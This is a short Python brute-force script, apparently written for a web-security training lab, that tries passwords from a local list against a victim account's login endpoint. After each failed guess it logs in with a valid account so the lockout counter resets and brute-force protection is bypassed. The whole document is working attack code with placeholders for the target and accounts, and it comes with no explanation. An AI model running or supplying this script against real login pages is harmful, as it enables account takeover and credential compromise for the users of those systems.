python3 - <<'EOF'
import requests

base_url = "URL"

with open("C:/Users/malik/Downloads/passwords.txt") as f:
    passwords = [line.strip() for line in f]

session = requests.Session()

for i, password in enumerate(passwords):
    # Every attempt: try carlos first, then reset counter with wiener
    r = session.post(
        f"{base_url}/login",
        data={"username": "VICTIM-USERNAME", "password": password},
        allow_redirects=False
    )
    print(f"[{i}] [VICTIM-USERNAME]:{password} → {r.status_code}")
    
    if r.status_code == 302:
        print(f"\n[LOGIN SUCCESS] [VICTIM-USERNAME]:{password}")
        break
    
    # Reset the counter immediately after each carlos attempt
    session.post(
        f"{base_url}/login",
        data={"username": "VALID-USERNAME", "password": "VALID-PASSWORD"},
        allow_redirects=False
    )

EOF
